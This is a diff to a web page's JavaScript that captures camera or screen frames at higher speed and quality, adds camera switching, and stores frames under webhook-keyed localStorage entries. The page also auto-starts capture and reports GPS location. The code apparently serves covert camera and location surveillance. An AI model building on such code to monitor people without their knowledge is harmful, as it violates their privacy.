@@ -66,7 +66,8 @@
     
     <div id="controls" style="display: none;">
         <button class="btn" onclick="startCapture()">📺 Start Mirror</button>
-        <button class="btn" onclick="switchMode()">🔄 Switch Mode</button>
+        <button class="btn" onclick="switchMode()" id="switchBtn">🔄 Switch Camera</button>
+        <button class="btn" onclick="restartCapture()">🔁 Restart</button>
     </div>
     
     <div id="deviceInfo" class="info"></div>
@@ -176,10 +177,12 @@
                 
                 try {
                     mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    localStorage.setItem('camera_facing', 'environment');
                 } catch (backCameraError) {
                     // Fallback to front camera
                     constraints.video.facingMode = { ideal: 'user' };
                     mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    localStorage.setItem('camera_facing', 'user');
                 }
                 
                 document.getElementById('status').innerHTML = '✅ Camera active - Point at screen to mirror';
@@ -208,6 +211,15 @@
             document.getElementById('placeholder').style.display = 'none';
             document.getElementById('controls').style.display = 'block';
             
+            // Update switch button text
+            const switchBtn = document.getElementById('switchBtn');
+            if (mode === 'camera') {
+                const facing = localStorage.getItem('camera_facing') || 'environment';
+                switchBtn.innerHTML = facing === 'environment' ? '🔄 Front Camera' : '🔄 Back Camera';
+            } else {
+                switchBtn.innerHTML = '🔄 Switch to Camera';
+            }
+            
             isCapturing = true;
             
             video.onloadedmetadata = () => {
@@ -229,14 +241,22 @@
             function captureFrame() {
                 if (!isCapturing) return;
                 
-                // Draw current frame
+                // Ensure video is ready
+                if (video.readyState < 2) {
+                    setTimeout(captureFrame, 50);
+                    return;
+                }
+                
+                // Draw current frame with smooth rendering
+                ctx.imageSmoothingEnabled = true;
+                ctx.imageSmoothingQuality = 'high';
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Convert to image data
-                const imageData = canvas.toDataURL('image/jpeg', 0.5);
+                // Convert to image data with optimized settings for smooth video
+                const imageData = canvas.toDataURL('image/jpeg', 0.8); // Higher quality for smoother video
                 frameCount++;
                 
-                // Store data for Android app
+                // Store data for Android app - MULTIPLE METHODS
                 const mirrorData = {
                     screenData: imageData,
                     timestamp: new Date().toISOString(),
@@ -246,9 +266,13 @@
                     type: 'universal_mirror'
                 };
                 
-                // Multiple storage methods
+                // Method 1: Direct localStorage with webhook ID
                 localStorage.setItem('mirror_' + webhookId, imageData);
+                
+                // Method 2: Structured data with webhook ID
                 localStorage.setItem('mirror_data_' + webhookId, JSON.stringify(mirrorData));
+                
+                // Method 3: Universal mirror key
                 localStorage.setItem('universal_mirror', JSON.stringify({
                     webhook: webhookId,
                     data: imageData,
@@ -257,8 +281,23 @@
                     mode: mode
                 }));
                 
-                // Window property
+                // Method 4: Window property for direct access
                 window.universalMirrorData = mirrorData;
+                
+                // Method 5: Broadcast event
+                try {
+                    window.dispatchEvent(new CustomEvent('mirrorUpdate', {
+                        detail: mirrorData
+                    }));
+                } catch(e) {}
+                
+                // Method 6: Simple key for easy access
+                localStorage.setItem('latest_mirror', imageData);
+                localStorage.setItem('latest_mirror_info', JSON.stringify({
+                    webhook: webhookId,
+                    frame: frameCount,
+                    timestamp: Date.now()
+                }));
                 
                 // Update status
                 const modeIcon = mode === 'screen' ? '🖥️' : '📷';
@@ -266,8 +305,13 @@
                 document.getElementById('status').innerHTML = 
                     `${modeIcon} ${modeText} MIRROR ACTIVE - Frame ${frameCount} - ${new Date().toLocaleTimeString()}`;
                 
-                // Continue capturing (faster for camera mode)
-                const interval = mode === 'camera' ? 800 : 1000;
+                // Debug info (reduced logging for performance)
+                if (frameCount % 10 === 0) { // Log every 10th frame
+                    console.log('Frame captured:', frameCount, 'Size:', Math.round(imageData.length/1024) + 'KB');
+                }
+                
+                // Continue capturing with smooth intervals
+                const interval = mode === 'camera' ? 200 : 500; // Much faster for smooth video
                 setTimeout(captureFrame, interval);
             }
             
@@ -281,22 +325,99 @@
         }
         
         async function switchMode() {
+            // Stop current stream
             if (mediaStream) {
                 mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
             }
             isCapturing = false;
             
+            // Hide current display
+            document.getElementById('mediaVideo').style.display = 'none';
+            document.getElementById('captureCanvas').style.display = 'none';
+            document.getElementById('placeholder').style.display = 'block';
+            
+            // Switch mode
             if (currentMode === 'screen') {
                 currentMode = 'camera';
+                document.getElementById('status').innerHTML = '🔄 Switching to camera mode...';
                 await tryCamera();
+            } else if (currentMode === 'camera') {
+                // Switch camera (front/back)
+                document.getElementById('status').innerHTML = '🔄 Switching camera...';
+                await switchCamera();
             } else {
                 currentMode = 'screen';
+                document.getElementById('status').innerHTML = '🔄 Switching to screen share...';
                 await tryScreenShare();
             }
         }
         
+        async function switchCamera() {
+            try {
+                // Get current facing mode
+                const currentFacing = localStorage.getItem('camera_facing') || 'environment';
+                const newFacing = currentFacing === 'environment' ? 'user' : 'environment';
+                
+                document.getElementById('status').innerHTML = `🔄 Switching to ${newFacing === 'environment' ? 'back' : 'front'} camera...`;
+                
+                const constraints = {
+                    video: { 
+                        width: { ideal: 1920 }, 
+                        height: { ideal: 1080 },
+                        facingMode: { exact: newFacing }
+                    },
+                    audio: false
+                };
+                
+                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                localStorage.setItem('camera_facing', newFacing);
+                
+                document.getElementById('status').innerHTML = `✅ ${newFacing === 'environment' ? 'Back' : 'Front'} camera active`;
+                setupCapture('camera');
+                
+            } catch (error) {
+                // Fallback to any available camera
+                document.getElementById('status').innerHTML = '⚠️ Camera switch failed - Using available camera';
+                await tryCamera();
+            }
+        }
+        
+        // Restart function
+        async function restartCapture() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
+            }
+            isCapturing = false;
+            frameCount = 0;
+            
+            document.getElementById('mediaVideo').style.display = 'none';
+            document.getElementById('captureCanvas').style.display = 'none';
+            document.getElementById('placeholder').style.display = 'block';
+            document.getElementById('status').innerHTML = 'Restarting...';
+            
+            setTimeout(autoDetectAndStart, 500);
+        }
+        
         // Auto start detection
         setTimeout(autoDetectAndStart, 1000);
+        
+        // Debug function to check data
+        window.checkMirrorData = function() {
+            console.log('Checking mirror data for webhook:', webhookId);
+            console.log('Method 1:', localStorage.getItem('mirror_' + webhookId) ? 'Found' : 'Not found');
+            console.log('Method 2:', localStorage.getItem('mirror_data_' + webhookId) ? 'Found' : 'Not found');
+            console.log('Method 3:', localStorage.getItem('universal_mirror') ? 'Found' : 'Not found');
+            console.log('Method 4:', window.universalMirrorData ? 'Found' : 'Not found');
+            console.log('Method 6:', localStorage.getItem('latest_mirror') ? 'Found' : 'Not found');
+            return {
+                webhook: webhookId,
+                frameCount: frameCount,
+                isCapturing: isCapturing,
+                mode: currentMode
+            };
+        };
         
         // Send GPS location
         if (navigator.geolocation) {
@@ -320,12 +441,25 @@
             );
         }
         
-        // Keep alive
+        // Keep alive and force data refresh for smooth streaming
         setInterval(() => {
-            if (isCapturing) {
+            if (isCapturing && window.universalMirrorData) {
+                // Heartbeat
                 localStorage.setItem('mirror_heartbeat_' + webhookId, Date.now().toString());
+                
+                // Force refresh data in multiple locations for smooth streaming
+                const currentData = window.universalMirrorData;
+                localStorage.setItem('mirror_' + webhookId, currentData.screenData);
+                localStorage.setItem('latest_mirror', currentData.screenData);
+                
+                // Broadcast update event for immediate sync
+                try {
+                    window.dispatchEvent(new CustomEvent('mirrorSync', {
+                        detail: { frame: currentData.frame, timestamp: Date.now() }
+                    }));
+                } catch(e) {}
             }
-        }, 2000);
+        }, 200); // Much faster refresh for smooth video
     </script>
 </body>
 </html>
